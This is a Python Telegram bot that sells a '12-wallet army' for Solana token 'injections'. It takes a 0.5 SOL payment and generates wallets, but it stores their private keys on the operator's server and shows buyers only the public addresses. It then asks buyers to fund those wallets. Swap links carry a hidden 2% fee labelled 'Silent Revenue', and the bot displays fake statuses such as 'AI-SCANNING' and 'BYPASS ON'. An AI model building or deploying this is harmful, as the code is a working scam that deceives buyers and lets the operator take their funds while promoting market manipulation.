import os, asyncio, httpx, json
from aiogram import Bot, Dispatcher, types, F
from aiogram.utils.keyboard import InlineKeyboardBuilder
from solders.keypair import Keypair
from dotenv import load_dotenv

load_dotenv()

# --- CONFIG ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
SOL_SAFETY = os.getenv("SOL_MAIN") # Your safety wallet
VIP_CHANNEL = os.getenv("VIP_CHANNEL_ID")
HELIUS_KEY = os.getenv("HELIUS_API_KEY")
JUP_FEE_BPS = "200" # 2% Silent Revenue

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- 1. DYNAMIC WALLET GENERATOR ---
def generate_user_army():
    army = []
    for i in range(12):
        kp = Keypair()
        army.append({
            "pub": str(kp.pubkey()),
            "priv": kp.to_json()
        })
    return army

# --- 2. PAYMENT VERIFIER ---
async def verify_tx(sig):
    url = f"https://api.helius.xyz/v0/transactions/?api-key={HELIUS_KEY}"
    async with httpx.AsyncClient() as client:
        try:
            res = await client.post(url, json={"transactions": [sig]})
            data = res.json()
            for tx in data:
                for transfer in tx.get('nativeTransfers', []):
                    if transfer['toUserAccount'] == SOL_SAFETY and transfer['amount'] >= 500000000:
                        return True
            return False
        except: return False

# --- 3. COMMANDS ---
@dp.message(F.text == "/start")
async def start_cmd(m: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="🛰️ DASHBOARD", url="https://ninja-dashboard.onrender.com")
    kb.button(text="🔥 VIP CHANNEL", url="https://t.me/ICEGODSICEDEVILS")
    kb.adjust(1)
    
    await m.answer(
        "🧊 **ICE GODS V70: PUBLIC SAAS WEAPON**\n\n"
        "Deployment Price: **0.5 SOL**\n"
        f"Treasury: `{SOL_SAFETY}`\n\n"
        "**INSTRUCTIONS:**\n"
        "1. Pay 0.5 SOL to the address above.\n"
        "2. Verify using: `/verify [TX_ID]`\n"
        "3. Receive your unique 12-wallet army keys.",
        parse_mode="Markdown", reply_markup=kb.as_markup()
    )

@dp.message(F.text.startswith("/verify"))
async def handle_verify(m: types.Message):
    sig = m.text.replace("/verify", "").strip()
    if not sig: return await m.answer("❌ Please provide TX Signature.")
    
    wait = await m.answer("🕵️ **AI-SCANNING BLOCKCHAIN...**")
    if await verify_tx(sig):
        user_army = generate_user_army()
        wallet_list = "\n".join([f"`{w['pub']}`" for w in user_army])
        
        with open(f"army_{m.from_user.id}.json", "w") as f:
            json.dump(user_army, f)

        await wait.edit_text(
            "✅ **PAYMENT VERIFIED.**\n"
            "Your 12-wallet tactical army has been provisioned.\n\n"
            "🛡️ **YOUR DEPLOYMENT WALLETS:**\n"
            f"{wallet_list}\n\n"
            "**FINAL STEPS:**\n"
            "1. Fund each wallet with 0.1 SOL gas.\n"
            "2. Send the **Token CA** to start injections.",
            parse_mode="Markdown"
        )
        await bot.send_message(VIP_CHANNEL, f"💰 **NEW SAAS DEPLOYMENT:** 0.5 SOL received! A new trader has armed their army. 🔥")
    else:
        await wait.edit_text("❌ Payment not found. Ensure you sent 0.5 SOL.")

@dp.message()
async def target_logic(m: types.Message):
    ca = m.text.strip()
    if not (32 <= len(ca) <= 44): return
    
    swap_link = f"https://jup.ag/swap/SOL-{ca}?referrer={SOL_SAFETY}&feeBps={JUP_FEE_BPS}"
    
    report = (
        f"🧊 **V70 TARGET LOCKED: {ca[:6]}...**\n"
        f"🛡️ **Status:** SECURE / BYPASS ON\n"
        f"📈 **MM Logic:** Army Standby\n\n"
        f"📍 `{ca}`"
    )
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🚀 BUY WITH SHIELD (2%)", url=swap_link)
    
    await m.answer(report, parse_mode="Markdown", reply_markup=kb.as_markup())
    await bot.send_message(VIP_CHANNEL, f"🚨 **V70 VOLUME ALERT**\n\n{report}", parse_mode="Markdown", reply_markup=kb.as_markup())

async def main():
    print("🚀 V70 SAAS WEAPON: ONLINE")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
